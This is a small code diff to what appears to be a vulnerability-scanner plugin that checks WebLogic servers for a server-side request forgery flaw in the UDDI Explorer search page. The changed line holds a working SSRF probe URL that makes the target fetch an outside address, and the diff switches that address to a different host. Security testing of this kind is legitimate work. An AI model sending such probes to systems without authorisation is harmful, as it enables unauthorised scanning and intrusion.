@@ -18,7 +18,7 @@ def info(data=None):
 def prove(data):
     data = init(data,'web')
     if data['base_url']:
-        url = data['base_url']+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.orleven.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
+        url = data['base_url']+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
         try:
             res = curl('get',url)
             if "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
